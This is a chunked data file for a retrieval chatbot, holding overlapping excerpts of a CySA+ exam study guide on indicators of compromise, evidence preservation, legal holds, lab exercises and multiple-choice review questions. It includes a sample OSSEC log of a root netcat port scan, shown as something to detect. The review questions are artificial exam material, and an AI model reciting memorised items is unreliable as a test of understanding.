rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	responding to a security incident that resulted in the unavailability of a website critical to her company’s operations. She is unsure of the amount of time and effort that it will take to recover the website. How should Renee classify the recoverability effort? A. Regular B. Supplemented C. Extended D. Not recoverable 15. Which one of the following is an example of an attrition attack? A. SQL injection B. Theft of a laptop C. User installs file sharing software D. Brute-­force password attack 16. Who is the best facilitator for a post-­incident lessons learned session? A. CEO B. CSIRT leader C. Independent facilitator D. First responder 17. Which one of the following elements is not normally found in an incident response policy? A. Performance measures for the CSIRT B. Definition of cybersecurity incidents C. Definition of roles, responsibilities, and levels of authority D. Procedures for rebuilding systems Review Questions 375 18. An on-­path attack is an example of what type of threat vector? A. Attrition B. Impersonation C. Web D. Email 19. Tommy is the CSIRT team leader for his organization and is responding to a newly discovered security incident. What document is most likely to contain step-­by-­step instructions that he might follow in the early hours of the response effort? A. Policy B. Baseline C. Playbook D. Textbook 20. Hank is responding to a security event where the CEO of his company had her laptop stolen. The laptop was encrypted but contained sensitive information about the company’s employees. How should Hank classify the information impact of this security event? A. None B. Privacy breach C. Proprietary breach D. Integrity loss Chapter 10 Incident Detection and Analysis THE COMPTIA CYBERSECURITY ANALYST (CYSA+) EXAM OBJECTIVES COVERED IN THIS CHAPTER INCLUDE: ✓✓ Domain 3.0 Incident Response and Management ■■ 3.2 Given a scenario, perform incident response activities ■■ Detection and analysis Responding to security incidents and network events is a common task for cybersecurity analysts, and to do so, you need to know how to detect and analyze indicators of compromise (IoCs), to acquire evidence, and to preserve it. Network-­based IoCs such as excessive or suspicious bandwidth consumption, probes and scans, and rogue devices are all likely to be encountered by security professionals, and knowing how to identify and understand them is critical for security practitioners. Host and application issues are also frequently IoCs, and knowing how to identify them requires understanding host performance problems, malware, and more focused attacks. Knowing what to look for, how to find it, and what your response options are is an important part of incident response activities. In this chapter, you’ll learn about indicators of compromise, including common network events ranging from bandwidth use and data exfiltration to scans, probes, and denial-­of-­ service attacks. After exploring IoCs, you will explore evidence acquisition concepts like preserving a chain of custody, validating data integrity, and how legal holds can impact preservation requirements. Indicators of Compromise Indicators of compromise (IoCs) consist of information gathered about activity, events, and behaviors
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	host performance problems, malware, and more focused attacks. Knowing what to look for, how to find it, and what your response options are is an important part of incident response activities. In this chapter, you’ll learn about indicators of compromise, including common network events ranging from bandwidth use and data exfiltration to scans, probes, and denial-­of-­ service attacks. After exploring IoCs, you will explore evidence acquisition concepts like preserving a chain of custody, validating data integrity, and how legal holds can impact preservation requirements. Indicators of Compromise Indicators of compromise (IoCs) consist of information gathered about activity, events, and behaviors that are commonly associated with potentially malicious behavior. Organizations monitor for IoCs using a variety of security tools and manual processes, looking for information that will allow them to detect potential issues or to respond to active compromises in a timely manner. You may also encounter the term indicators of attack, or IoAs. While it’s less commonly used and doesn’t show up in the CySA+ exam objectives, it can be useful to know the difference between an IoC and an IoA. IoAs can be identified while an attacker is actually conducting an attack. IoCs focus on gathering data and thus tend to be more forensic in nature. This line is often blurred in practice, so you may see the term IoC used to broadly mean evidence of attacks or compromise. Common indicators of compromise include but are not limited to the following: ■■ ■■ Unusual network traffic, including unusual outbound network traffic, unexpected peer-­ to-­peer traffic, activity to abnormal ports or IP addresses, and similar events Increases in database or file share read volume Indicators of Compromise ■■ Suspicious changes to filesystems, the Windows Registry, and configuration files ■■ Traffic patterns that are unusual for human usage of a system ■■ Login and rights usage irregularities, including geographic and time-­based anomalies ■■ Denial-­of-­service activities and artifacts ■■ Unusual DNS traffic 379 The ability to capture, analyze, and correlate IoCs is critical to organizational security and incident response, making IoC feeds an important part of defensive operations. IoC feeds provide community information about threats and threat actors like the following: ■■ IP addresses and hostnames associated with malicious actors or active threats ■■ Domain names used by malware, command-and-control servers, and infected websites ■■ Hashes of malicious software ■■ Behavior-­based information for threat actors and malware You can explore IoC examples via Alienvault’s Open Threat Exchange at https://otx .alienvault.com, where you’ll find millions of indicators that you can browse through to better understand examples of IoCs. Figure 10.1 shows the dashboard from OTX. One of the first things to note is that a domain alone might not be truly useful—­the image shows apple-­icloud-­mx.com, which means you need to learn more about why it shows in the feed. F I G U R E 10 . 1 The Alienvault Open Threat Exchange dashboard 380 Chapter 10 ■ Incident Detection and Analysis Figure 10.2 shows the drill-­down for the domain. It has been
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	via Alienvault’s Open Threat Exchange at https://otx .alienvault.com, where you’ll find millions of indicators that you can browse through to better understand examples of IoCs. Figure 10.1 shows the dashboard from OTX. One of the first things to note is that a domain alone might not be truly useful—­the image shows apple-­icloud-­mx.com, which means you need to learn more about why it shows in the feed. F I G U R E 10 . 1 The Alienvault Open Threat Exchange dashboard 380 Chapter 10 ■ Incident Detection and Analysis Figure 10.2 shows the drill-­down for the domain. It has been labeled as a potentially being created by a domain generation algorithm, a common technique used by malicious actors that we’ll discuss when we look at DNS-­related IoCs later in this chapter. With that information, you might choose to review DNS logs, block the domain at your organization’s network border, or simply feed the IoC into your IPS or other border security device. F I G U R E 10 . 2 Details for an OTX IoC Exam Note If you’ve never explored IoCs before, setting up an account and exploring OTX or a similar freely available tool can be both educational and eye-­opening. As of this writing, 36 million IoCs were listed on OTX. That’s a massive amount of data to explore, let alone use! Fortunately, you don’t have to be an expert on using IoCs for the exam; instead, you should focus on understanding the concepts of IoCs and considering how you might detect a compromise given example data like logs or a scenario. IoC feeds are available as both commercial subscription feeds and as open, free feeds like those found through the Open Threat Exchange. As with any third party data, organizations need to determine the level of reliability for the feed and any data used from it, and must also consider what data they will act on, how they will use it, and how it can be integrated into their environment. Next we’ll look at how you can detect, capture, analyze, and correlate IoCs. Investigating IoCs 381 If you’re looking for exercises that will include IoCs and other cyberattack response activities, the SANS Holiday Hack Challenges are intended to provide experience to a variety of skill levels. You can find them at https://holidayhackchallenge.com/past-­challenges, although not all of them remain live. Investigating IoCs Over the next few pages we will explore examples of IoCs, including where data about IoCs can be found and basic techniques to identify them. Since IoCs can vary greatly, you should consider this series of examples to be a starting point, not a complete list. As you review each type of IoC, consider what types of tools and techniques you could use to both capture data about the IoC, how you would determine if the behavior was unusual but legitimate traffic or if it might indicate a compromise, and what thresholds you would assign to ensure that likely issues were detected and alerted on
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	we will explore examples of IoCs, including where data about IoCs can be found and basic techniques to identify them. Since IoCs can vary greatly, you should consider this series of examples to be a starting point, not a complete list. As you review each type of IoC, consider what types of tools and techniques you could use to both capture data about the IoC, how you would determine if the behavior was unusual but legitimate traffic or if it might indicate a compromise, and what thresholds you would assign to ensure that likely issues were detected and alerted on while not overloading security practitioners. Unusual Network Traffic Unusual network traffic is one of the most common indicators of compromise, but it can also be a challenge to identify due to adversarial techniques intended to make it hard to see. Attackers will use encrypted protocols like TLS to protect web traffic, will encapsulate traffic in otherwise innocuous data flows, and will otherwise try to conceal their activity to avoid detection. Chapter 3, “Malicious Activity,” provided greater detail on network, system, and application events. This section focuses on indicators rather than how you might capture the data, so flip back to Chapter 3 if you need to review that. One network and system-­based IoC profile focuses on the use of abnormal ports for traffic. Typical service ports for common services are well-documented, and while organizations may opt to use alternate ports to allow a system to run multiple independent services or to limit the impact of default port scans, services receiving traffic on unusual ports may indicate a compromise. Thus, many tools will review network traffic and flag unusual or unexpected service ports. It can be tempting to immediately consider unusual source ports as a detection as well. Since source ports for traffic are randomized in most cases, it is much harder to detect unusual source ports as a potential IoC. In fact, analysts who haven’t worked with network traffic capture may see a source port that looks interesting and spend a lot of time chasing nothing! Unexpected communication isn’t just the beaconing we looked at in Chapter 3. It may include attack or information gathering traffic like port and vulnerability scans, peer-­to-­peer traffic in a datacenter where systems should be communicating outbound instead of among themselves, or any of a variety of other traffic scenarios that don’t fit typical patterns. Like many 382 Chapter 10 ■ Incident Detection and Analysis of the IoCs we’ll review here, behavior and pattern recognition can help identify unexpected communication. Firewalls and appropriate trust boundaries can help detect issues via firewall logs and limit impact by not allowing unexpected traffic to successfully traverse the network. Figure 10.3 shows an example in which an attacker has gained access to a single system in a datacenter and is using that system to probe other systems in the same network segment. F I G U R E 10 . 3 Probes from a compromised system TCP connection attempts,
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	Like many 382 Chapter 10 ■ Incident Detection and Analysis of the IoCs we’ll review here, behavior and pattern recognition can help identify unexpected communication. Firewalls and appropriate trust boundaries can help detect issues via firewall logs and limit impact by not allowing unexpected traffic to successfully traverse the network. Figure 10.3 shows an example in which an attacker has gained access to a single system in a datacenter and is using that system to probe other systems in the same network segment. F I G U R E 10 . 3 Probes from a compromised system TCP connection attempts, ports 80, 443, 1432, 3389 Attacker Datacenter server Monitoring outbound network traffic can help identify IoCs, too. You could observe many outbound traffic indicators, including these: ■■ Traffic to unexpected locations ■■ Unusual types of outbound traffic like RDP, SSH, or file transfers ■■ Unusual volumes of outbound traffic ■■ Outbound DNS queries ■■ DNS queries for unexpected domains or domains flagged as malicious in reputation tools ■■ Outbound traffic at unusual times Increases in Resource Usage Resource utilization can indicate actions taken by an attacker in a variety of ways. Attackers may consume CPU or memory due to their use of tools or utilities, or they may gather data, taking up more disk space. Network usage may increase as data is transferred, scans are run, or other activities occur. Thus, resource usage-­based IoCs are often used to help identify unusual behavior that may indicate compromise. Another commonly cited IoC is database read volume. It can be both a useful indicator of compromise, as unusual spikes may indicate an attacker gathering data from the database, and can also be difficult to identify as related to an attack or compromise without additional information about what is driving the increase in database usage. Investigating IoCs 383 Figure 10.4 shows data from PoWA (PostgreSQL Workload Analyzer), a Postgres monitoring tool. While PoWA provides many datapoints, this graph from PoWA’s free online demonstration site provides an example of visibility into block access in bytes per second. You can see both cached hits and disk read increases in the middle of the chart, then a return to the baseline at the end. F I G U R E 10 . 4 Database read volume in PoWA for Postgres You can explore other monitoring tools for Postgres at https://wiki .postgresql.org/wiki/Monitoring, and you can try PoWA at http://demo-­powa.anayrat.info by clicking Login. This doesn’t mean that every resource usage increase indicates a compromise. Instead, it means that other IoCs are often combined with resource usage indicators that may help identify a compromise when assessed together. Chapter 3 has more detail about resource usage, including specific tools that can help monitor usage on local systems. Unusual User and Account Behaviors Behavior-­based IoCs are incredibly powerful, as attackers almost always have to do something that users, services, and systems typically won’t. That means that if you can identify normal behaviors using profiling, baselines, and similar techniques you can more easily
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	http://demo-­powa.anayrat.info by clicking Login. This doesn’t mean that every resource usage increase indicates a compromise. Instead, it means that other IoCs are often combined with resource usage indicators that may help identify a compromise when assessed together. Chapter 3 has more detail about resource usage, including specific tools that can help monitor usage on local systems. Unusual User and Account Behaviors Behavior-­based IoCs are incredibly powerful, as attackers almost always have to do something that users, services, and systems typically won’t. That means that if you can identify normal behaviors using profiling, baselines, and similar techniques you can more easily identify potential behavior-­based IoCs. 384 Chapter 10 ■ Incident Detection and Analysis Here are common examples of these behavior-­based IoCs: ■■ ■■ ■■ ■■ Unusual privileged account behaviors are critical to monitor for, but privileged accounts can also be more likely to perform unusual activities. System administrators may need to use some commands very rarely, for example, which can lead to alerts. Despite this, monitoring the use of privileged accounts and their behavior is critical to security operations. Escalation of privileges and addition of users to new groups with greater rights should be monitored. Monitoring for the addition of privileges to accounts is a key part of security monitoring, and new privileges being added should be flagged as part of IoC monitoring. Administrative privileges in particular need to be monitored, audited, and reported on. Bot-­like behaviors are also a key behavior-­based identifier. Humans typically don’t run commands at high speed, so looking for occurrences that happen faster than a human typically works can identify some compromises. Logging into multiple systems and performing actions can also be a flag, but in both cases legitimate scripts and tools can also have similar behavior patterns. User and account behavior-­based identification requires an understanding of what and how users perform their jobs, what their rights and privileges should be, combined with a process and capability to analyze unusual events to determine if they’re simply a user doing something new or infrequent or if malicious activity is occurring. File and Configuration Modifications Changes to files, particularly configuration files, log files, or other files that may be useful to an attacker, are common IoCs. Filesystem monitoring tools OSSEC (Open Source HIDS SECurity) and Tripwire serve as host intrusion detection systems monitoring for intrusion behavior like unauthorized file\ system modification. OSSEC is available in both commercial and open source versions. You can download the open source version at www.ossec.net/ ossec-­downloads to try it. OSSEC logs can provide useful information about events on a host as well, like the example shown here where a user ran netcat as root: ** Alert 251089428.105: -­syslog,sudo 2023 Mar 11 00:03:15 example-­ >/var/log/syslog-­ ng/messages Rule: 2100 (level 3) -­ > 'Successful sudo to ROOT executed' User: root Mar 11 03:14:30 example sudo: root : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/usr/home/nc -­ z -­ v 192.168.10.1 Investigating IoCs 385 Of course, attackers may simply be using your filesystem for their own purposes.
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	open source versions. You can download the open source version at www.ossec.net/ ossec-­downloads to try it. OSSEC logs can provide useful information about events on a host as well, like the example shown here where a user ran netcat as root: ** Alert 251089428.105: -­syslog,sudo 2023 Mar 11 00:03:15 example-­ >/var/log/syslog-­ ng/messages Rule: 2100 (level 3) -­ > 'Successful sudo to ROOT executed' User: root Mar 11 03:14:30 example sudo: root : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/usr/home/nc -­ z -­ v 192.168.10.1 Investigating IoCs 385 Of course, attackers may simply be using your filesystem for their own purposes. Unexpected data aggregation or collection may indicate attackers have gathered data from elsewhere in your organization and are collecting it in a location before transferring it out. Unexpected patching can be a surprising IoC, but in at least some cases attackers have patched systems to ensure that others cannot follow them through a flaw that they themselves have exploited. Login and Rights Usage Anomalies Geographic concerns and detection are a common focus. One common IoC detection pattern is to look for a single user or account logging in from multiple different geographic locations in a short period of time. A similar detection technique looks for users who are logged in and active from different geographic locations at the same time. While it’s possible that they’re using a VPN or other technology that can cause confusion, simultaneous login and activity is still worth investigating—­and possibly limiting in policies! There are also numerous time-­based IoCs. While working hours for employees may be fixed for some organizations, identifying unusual working hours for other staff may be difficult depending on their work habits and the organization’s practices. Combining geographic and time-­based analyses is used to determine when someone has apparently traveled farther than is physically possible in a given time period. Logins and rights usage time-­based IoCs focus on when a user is typically likely to perform an action like logging in, if they are performing specific tasks, or even what their work hours are so that they can be checked for off-­hours logins. Time-­based IoCs can result in false-­positive indicators when employee behaviors vary, which means they may not be wellsuited to some types of employees or roles. In many cases they can be tuned to have a lower false positive rate. The classic example of a time and geographic difference–based IoC is that of an employee who logs in in their normal location, then logs in a location hundreds of miles away minutes or just a couple of hours later. That’s called “impossible travel” and may indicate an issue, even if it’s not actually an attacker. Pattern recognition, baselining, and anomaly detection are all critical capabilities when privilege and account usage are being analyzed. Denial of Service Denial-of-service (DoS) attacks can be a direct attack from a single system or can be distributed. Distributed DoS attacks, like the simplified example shown in Figure 10.5, can be particularly difficult to differentiate from legitimate
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	that of an employee who logs in in their normal location, then logs in a location hundreds of miles away minutes or just a couple of hours later. That’s called “impossible travel” and may indicate an issue, even if it’s not actually an attacker. Pattern recognition, baselining, and anomaly detection are all critical capabilities when privilege and account usage are being analyzed. Denial of Service Denial-of-service (DoS) attacks can be a direct attack from a single system or can be distributed. Distributed DoS attacks, like the simplified example shown in Figure 10.5, can be particularly difficult to differentiate from legitimate high-­traffic scenarios. Since distributed DoS attacks can come from many machines, they can be difficult to identify, difficult to attribute, and difficult to stop. 386 Chapter 10 F I G U R E 10 . 5 ■ Incident Detection and Analysis Denial-­of-­service attack Botnet Systems Botnet Control node Attacker Target website Denial-­of-­service attacks that originate from systems inside your network are another example of an indicator of compromise. They may not always indicate that the system or device itself is compromised, however. Amplification attacks have historically leveraged service vulnerabilities that amplified traffic without requiring the underlying service or system to be compromised. One type of denial-­of-­service amplification attack is a DNS amplification attack. In this type of attack, malicious actors use open DNS resolvers to increase attack volume by sending many small queries that require large responses. You can read more about this type of attack here: www.cloudflare.com/learning/ddos/ dns-­amplification-­ddos-­attack Despite the challenges that DoS attacks can present to investigation, the occurrence of a DoS attack is an IoC. Finally, an IoC that may look like a DoS attack, but that often is associated with exploit attempts or other non-­DoS activities, is repeated requests for the same file or directory. It’s important to remember that IoCs may appear to be some other activity or may not be understood when they’re discovered. Investigating IoCs 387 Unusual DNS Traffic Many organizations monitor queries sent to their DNS servers, comparing them to lists of malicious sites using threat and reputation feeds. IoC feeds may include specific IP addresses and hostnames that are commonly used by active threats, allowing DNS query and server monitoring to help identify compromised systems. Remember that security staff may inadvertently trip IoC-­based rules as they validate potential issues. It can be tempting to place security team systems in an allow-­listed group to avoid alerts, but that would also mean that compromised systems belonging to the team might go unnoticed! Monitoring for DNS-­related IoCs often focuses on the following: ■■ ■■ ■■ Abnormal levels of DNS queries, particularly to unusual domain names Unusual domain name queries, often to randomly generated or machine generated hostnames like jku845.com. Large numbers of DNS query failures that may indicate use of automatically generated DNS names embedded in malware Depending on the complexity of the malware, indicators of compromise related to DNS and hostnames may be useful for some time or may update quickly as the
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	group to avoid alerts, but that would also mean that compromised systems belonging to the team might go unnoticed! Monitoring for DNS-­related IoCs often focuses on the following: ■■ ■■ ■■ Abnormal levels of DNS queries, particularly to unusual domain names Unusual domain name queries, often to randomly generated or machine generated hostnames like jku845.com. Large numbers of DNS query failures that may indicate use of automatically generated DNS names embedded in malware Depending on the complexity of the malware, indicators of compromise related to DNS and hostnames may be useful for some time or may update quickly as the malware rotates new names based on an algorithm or command-and-control updates. DNS tunneling is another potential issue that can be monitored using tools like IDS and IPS. Tunneling command-and-control information via DNS queries, or DNS queries that include encoded or encrypted data, are potential IoCs to watch for. A final type of unusual DNS traffic is the use of fast-­flux DNS, which quickly changes IP addresses for a domain. Attackers use fast-­flux DNS to keep their command-and-control infrastructure active even if some hosts are taken down, and observing queries that are involved in fast-­flux DNS would indicate that the system might be compromised—­or that the user may have clicked a link to a malicious site! You can read more about fast-­flux DNS, including double fast-­flux DNS at www.cloudflare.com/learning/dns/dns-­fast-­flux. Combining IoCs Effectively using indicators of compromise typically requires combining data and analysis from multiple IoCs to identify a compromise. It is less likely for a single IoC to occur in isolation in a compromise scenario, although it can happen. Thus, organizations look for ways to combine information and threat feeds, log and log analysis tools, and IoC feeds and detection mechanisms into a comprehensive system that will remain up-­to date and which will look at whether multiple IoCs add up to a likely compromise. 388 Chapter 10 ■ Incident Detection and Analysis Evidence Acquisition and Preservation Evidence acquisition during incident response activities can take a number of forms, ranging from making copies or files to taking snapshots of virtual machines to using forensic file or drive copies. Preservation Regardless of the data types and acquisition methods, a key concept for evidence is preservation. Preserving data requires acquiring it, validating the acquisition and data, and storing it in a secure and documented manner. If the evidence may be required for a legal case, or if law enforcement is involved, preservation will also typically require chain-­of-­custody documentation. Chain of Custody Chain-­of-­custody processes track evidence through its life cycle, including the collection, preservation, and analysis of the evidence. This requires documentation of who has access to the data, when, where, why and how it is stored and used or transferred. Complete documentation of a chain of custody helps to ensure that the data was not inappropriately accessed or modified. Legal Hold Legal holds are a part of eDiscovery processes. Legal counsel will issue a legal hold notice to organizations when litigation is about to
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	case, or if law enforcement is involved, preservation will also typically require chain-­of-­custody documentation. Chain of Custody Chain-­of-­custody processes track evidence through its life cycle, including the collection, preservation, and analysis of the evidence. This requires documentation of who has access to the data, when, where, why and how it is stored and used or transferred. Complete documentation of a chain of custody helps to ensure that the data was not inappropriately accessed or modified. Legal Hold Legal holds are a part of eDiscovery processes. Legal counsel will issue a legal hold notice to organizations when litigation is about to start or is underway. Data custodians in the impacted organization will be notified to preserve data, including data that might otherwise have been deleted or removed as part of normal business processes. The organization is obligated to preserve and produce the data as part of the legal process. Organizations may also undertake legal hold processes themselves if they expect to face lawsuits or other legal action. Validating Data Integrity An important part of preservation activities is validating data integrity. To verify that the capture process did not inadvertently create changes, ensure that the data captured and retained matches the original data. While this is critical for evidence and for legal cases, it is also important for organizational investigations to ensure that bad data doesn’t lead investigators to incorrect conclusions. Data integrity validation is commonly accomplished using hashing tools that calculate a hash based on the original file, volume, or drive, and that then calculate a hash using the same algorithm against the copied evidence. These hashes are stored and validated Summary 389 when the copy is used to ensure that a matching copy is in use, as shown in FTK Imager in Figure 10.6. F I G U R E 10 . 6 FTK Imager with hashes shown after a successful image Exam Note The CySA+ exam expects you to be familiar with evidence acquisitions. Be sure you understand chain of custody, data integrity validation, preservation, and legal holds. Summary Indicators of compromise are data gathered about events, actions, and behaviors that are commonly associated with malicious behavior. They include things like unusual network traffic, increases in database or filesystem usage, suspicious changes to files or configurations, login and rights usage irregularities, denial-­of-­service issues, and similar events. Security analysts need to be able to locate, identify, and respond to IoCs. 390 Chapter 10 ■ Incident Detection and Analysis As a security professional, you’ll need to understand common IoCs such as traffic to unexpected destinations, unusual outbound network traffic, increases in DNS queries or DNS queries for unexpected domains that appear machine generated, and traffic at unusual times. You’ll need to understand typical user behavior and how to identify unexpected user behavior based on privilege usage, escalation of privileges, and bot-­like and scripted behaviors. File and configuration modifications can be seen using monitoring tools. Geographic and time-­based monitoring techniques and concepts help to identify malicious users abusing compromised accounts. Of course,
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	390 Chapter 10 ■ Incident Detection and Analysis As a security professional, you’ll need to understand common IoCs such as traffic to unexpected destinations, unusual outbound network traffic, increases in DNS queries or DNS queries for unexpected domains that appear machine generated, and traffic at unusual times. You’ll need to understand typical user behavior and how to identify unexpected user behavior based on privilege usage, escalation of privileges, and bot-­like and scripted behaviors. File and configuration modifications can be seen using monitoring tools. Geographic and time-­based monitoring techniques and concepts help to identify malicious users abusing compromised accounts. Of course, combining IoCs together helps to ensure that actual malicious events are captured instead of flagging abnormal but legitimate occurrences. When IoCs are detected, evidence of the event and related incident materials must be acquired and preserved. Legal holds are common when legal action is pending or underway, and security analysts may need to be involved in preservation of data as part of holds in addition to during incident response activities. Events that may result in legal cases typically require a proper chain-­of-­custody documentation process that records how data is captured, collected, and handled; by whom; and when and how it is accessed and analyzed. Exam Essentials Describe the importance of IoCs to incident detection and analysis. List and understand common IoCs, including unusual network traffic unexpected peer-­to-­peer traffic; activity to unusual ports or IP addresses; increases in database or file share read volume; suspicious changes to filesystems, the Windows Registry, and configuration files; traffic patterns that are unusual for human usage of a system; and login and rights usage irregularities, including geographic and time-­based anomalies, denial-­of-­service activities and artifacts, and unusual DNS traffic. Investigate and describe IoCs. Describe IoCs related to network traffic, resource usage, user and account behaviors, file and configuration modifications, privilege use, denial of service, and DNS traffic. Explain common examples of IoCs related to each topic, how you might leverage the IoCs, and what information from log files and other evidence might be relevant to identifying an indicator of compromise. Understand evidence acquisition and preservation. Evidence is commonly acquired and preserved as part of incident response activities, internal investigations, and due to legal holds as part of pending or current legal proceedings. Legal holds may require normal processes or procedures for data destruction or that limit lifespans of data to be suspended, or independent, verifiable copies may need to be made. Chain-­of-­custody documentation is created and maintained for legal and police investigations, but may also be created if investigations might become part of a legal proceeding. Review log files and determine if an incident occurred. Understand common log files and what to look for to determine if events recorded indicate an incident likely occurred or if log entries indicate normal behaviors. Lab Exercises 391 Lab Exercises Activity 10.1: Explore IoCs in Alienvault’s Open Threat Exchange In this exercise, you will explore IoC examples from Alienvault’s Open Threat Exchange. 1. Visit https://otx.alienvault.com and sign up for an
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	may need to be made. Chain-­of-­custody documentation is created and maintained for legal and police investigations, but may also be created if investigations might become part of a legal proceeding. Review log files and determine if an incident occurred. Understand common log files and what to look for to determine if events recorded indicate an incident likely occurred or if log entries indicate normal behaviors. Lab Exercises 391 Lab Exercises Activity 10.1: Explore IoCs in Alienvault’s Open Threat Exchange In this exercise, you will explore IoC examples from Alienvault’s Open Threat Exchange. 1. Visit https://otx.alienvault.com and sign up for an account. 2. Log in and review your dashboard. Note that there are pulses, which are threat information shared by the community. 3. Select Browse and review a pulse. You should see information such as IoCs, which you can click and review. If you don’t, select another pulse. Consider these questions: How would you use the information contained in a pulse? Why might you want to subscribe to a pulse? How would you determine if a pulse author was trustworthy? 4. Return to the dashboard and select Indicators. 5. Use the indicator type and role selectors to the left to browse for an indicator of interest. Explore a number of types of indicators and consider how you might use each detection in your organization. Consider the following questions: What types would be useful? What additional information would you want? 6. Explore the dashboard, and select the visualization of the malware item. Click a major malware family and review the features and malware details page. What can you learn from the page? What do related pulses tell you? How would you use this information? Activity 10.2: Identifying Suspicious Login Activity Detecting malicious activity using text searches is a common activity for security professionals. You can find examples intended for machine learning (ML) with Elasticsearch at: https://github.com/elastic/examples/tree/master/Machine%20Learning/ Security%20Analytics%20Recipes, although other log examples can be found with a bit of searching too. In this exercise you will search through log examples to identify potentially malicious login activity. 1. Navigate to the suspicious_login_activity folder. 2. Navigate to the data folder. 392 Chapter 10 3. Download auth.log. 4. Using a search tool like grep, search for strings matching Connection From: ■ Incident Detection and Analysis ■■ What occurred with connections to 10.77.20.248? ■■ Are these connections suspicious, and why? ■■ How would you determine what occurred once the connection was made? ■■ What other information do these log entries provide? Activity 10.3: Legal Holds and Preservation In this exercise you will prepare a preservation plan for an organization that you are familiar with. 1. Identify an organization or group that you are familiar with. What data do they have? What processes do they use for storage, life cycle, and deletion? 2. Presume that the organization receives a legal hold notice for email, files, or other business data. For this exercise, only pick one to help you with your scope and planning. 3. Document what the organization
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	once the connection was made? ■■ What other information do these log entries provide? Activity 10.3: Legal Holds and Preservation In this exercise you will prepare a preservation plan for an organization that you are familiar with. 1. Identify an organization or group that you are familiar with. What data do they have? What processes do they use for storage, life cycle, and deletion? 2. Presume that the organization receives a legal hold notice for email, files, or other business data. For this exercise, only pick one to help you with your scope and planning. 3. Document what the organization would need to do to modify their practices to preserve the data you have selected. Write down what changes would be necessary, how data could be preserved, how it would be kept, and who would need to be notified. 4. 5. Consider the following questions about the production process: ■■ What do you need to do to provide the data to a third party? ■■ How could it be downloaded or sent to the third party? ■■ What concerns might the organization have about the data being sent? ■■ What business impact would preservation have on the organization? ■■ What costs might the organization face? Finally, consider what the organization would need to do once the legal hold was released. What would it take to return to normal operations? Review Questions 393 Review Questions 1. 2. 3. 4. 5. Susan needs to track evidence that has been obtained throughout its life cycle. What documentation does she need to create and maintain if she expects the evidence to be used in a legal case? A. Forensic hashes B. Legal hold C. Chain of custody D. IoC ratings Hui wants to comply with a legal hold but knows that her organization has a regular process that purges logs after 45 days due to space limitations. What should she do if the logs are covered by the legal hold? A. Notify counsel that the logs will be deleted automatically in 45 days. B. Delete the logs now to allow longer before space is filled up. C. Identify a preservation method to comply with the hold. D. Make no changes; holds allow ongoing processes to continue as normal. Juan wants to validate the integrity of a drive that he has forensically imaged as part of an incident response process. Which of the options should he select? A. Compare a hash of the original drive to the drive image. B. Compare the file size on disk of the original drive to the space taken up by the drive image. C. Compare the vendor’s drive size listing to the space taken up by the drive image. D. Use PGP to encrypt the drive and image and make sure that both encrypted versions match. Kathleen wants to determine if the traffic she is seeing is unusual for her network. Which of the following options would be most useful to determine if traffic levels are not typical for
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	he select? A. Compare a hash of the original drive to the drive image. B. Compare the file size on disk of the original drive to the space taken up by the drive image. C. Compare the vendor’s drive size listing to the space taken up by the drive image. D. Use PGP to encrypt the drive and image and make sure that both encrypted versions match. Kathleen wants to determine if the traffic she is seeing is unusual for her network. Which of the following options would be most useful to determine if traffic levels are not typical for this time of day in a normal week? A. Heuristics B. Baselines C. Protocol analysis D. Network flow logs Renee wants to adopt an open IoC feed. What issue is Renee most likely to need to address when adopting it? A. The cost of the IoC feed B. The quality of the feed C. The update frequency of the feed D. The level of detail in the feed Chapter 10 394 6. 7. 8. 9. ■ Incident Detection and Analysis Chris wants to use an active monitoring approach to test his network. Which of the following techniques is appropriate? A. Collecting NetFlow data B. Using a protocol analyzer C. Pinging remote systems D. Enabling SNMP Which of the following is not information commonly found in an IoC? A. IP addresses B. Domain names C. System images D. Behavior-­based information Cameron wants to be able to detect a denial-­of-­service attack against his web server. Which of the following tools should he avoid? A. Log analysis B. Flow monitoring C. iPerf D. IPS Sameer finds log information that indicates that a process that he believes is malicious starts at the same time every day on a Linux system. Where should he start looking for an issue like this? A. He should review the system log. B. He should check the Task Scheduler. C. He should check cron jobs. D. He should check user directories. 10. Jim uses an IoC feed to help detect new attacks against his organization. What should he do first if his security monitoring system flags a match for an IoC? A. Shut down the system that caused the alert B. Review the alert to determine why it occurred C. Check network logs to identify the remote attacker D. Run a port scan to determine if the system is compromised 11. While monitoring network traffic to his web server cluster, Mark notices a significant increase in traffic. He checks the source addresses for inbound traffic and finds that the traffic is coming from many different systems all over the world. What should Mark identify this as if he believes that it may be an attack? A. A denial-­of-­service attack B. A distributed network scan Review Questions C. A DNS-­based attack D. A distributed denial-­of-­service attack 395 12. Valentine wants to check for unauthorized access to a system. What two log types are most likely to contain this information? A.
